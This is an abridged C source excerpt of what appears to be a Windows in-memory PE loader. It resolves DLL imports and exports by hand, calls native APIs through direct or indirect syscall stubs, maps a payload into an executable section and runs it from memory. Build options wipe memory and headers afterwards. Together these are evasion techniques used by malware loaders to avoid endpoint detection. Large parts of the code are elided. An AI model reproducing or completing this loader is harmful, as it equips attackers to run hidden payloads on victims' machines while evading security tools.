...
#ifndef SYSCALL_H
#error "direct_syscall.h or indirect_syscall.h must be included"
#endif
...
static ULONG_PTR ResolveExport(LdrLoadDll_t LdrLoadDll, HMODULE mod, const char* name, int isOrdinal) {
    HMODULE curMod = mod;
    ...
    for (;;) {
        ...
        if (foundRVA >= ed.VirtualAddress && foundRVA < ed.VirtualAddress + ed.Size) {
            ...
            size_t fnameLen = 0;
            char* fnamePtr = s + dllLen + 1;
            while (fnamePtr[fnameLen]) fnameLen++;
...
static void ResolveImport(HMODULE hNtdll, BYTE* base, IMAGE_DATA_DIRECTORY im) {
    ...
    while (imp->Name) {
        const char* dll = (char*)(base + imp->Name);
        ...
        LdrLoadDll(NULL, 0, &ustr, (PHANDLE)&mod);
        ...
        for (; orig->u1.AddressOfData; orig++, addr++) {
            ...
            addr->u1.Function = ResolveExport(LdrLoadDll, mod, funcName, isOrdinal);
        }
        imp++;
    }
}
...
static void ExecuteFromMemory(SYSCALL_CTX *sc, unsigned char* data) {
    ...
    // Create RWX section
    SYSCALL_PREPARE(sc, ntcreatesection);
    NtCreateSection_t NtCreateSection = SYSCALL_CALL(sc, NtCreateSection_t);
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    FreeSyscallStub(sc, NtCreateSection);

    // Map initial RW view
    PVOID base = NULL;
    SIZE_T viewSize = 0;
    SYSCALL_PREPARE(sc, ntmapviewofsection);
    NtMapViewOfSection_t NtMapViewOfSection = SYSCALL_CALL(sc, NtMapViewOfSection_t);
    ...
    // Resolve imports
    ResolveImport(sc->hNtdll, (BYTE*)base, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);

    // Unmap RW view
    SYSCALL_PREPARE(sc, ntunmapviewofsection);
    NtUnmapViewOfSection_t NtUnmapViewOfSection = SYSCALL_CALL(sc, NtUnmapViewOfSection_t);
    NtUnmapViewOfSection((HANDLE)-1, base);
    FreeSyscallStub(sc, NtUnmapViewOfSection);

    // Map WCX view for execution
    base = NULL;
    viewSize = 0;
    NtMapViewOfSection(hSection, (HANDLE)-1, &base, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_WRITECOPY);
    FreeSyscallStub(sc, NtMapViewOfSection);

    // Close section handle
    SYSCALL_PREPARE(sc, ntclose);
    NtClose_t NtClose = SYSCALL_CALL(sc, NtClose_t);
    NtClose(hSection);
    FreeSyscallStub(sc, NtClose);

    // Pre‑mark entire module as WC
    ULONG oldProtect;
    SYSCALL_PREPARE(sc, ntprotectvirtualmemory);
    NtProtectVirtualMemory_t NtProtectVirtualMemory = SYSCALL_CALL(sc, NtProtectVirtualMemory_t);
    ...
    #if !defined(WIPEMEM) && !defined(WIPEHEADERS)
        FreeSyscallStub(sc, NtProtectVirtualMemory);
    #endif

    // Free discardable sections
    SYSCALL_PREPARE(sc, ntfreevirtualmemory);
    NtFreeVirtualMemory_t NtFreeVirtualMemory = SYSCALL_CALL(sc, NtFreeVirtualMemory_t);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    ...
    #if !defined(WIPEMEM) && !defined(WIPEHEADERS)
	    FreeSyscallStub(sc, NtFreeVirtualMemory);
    #endif
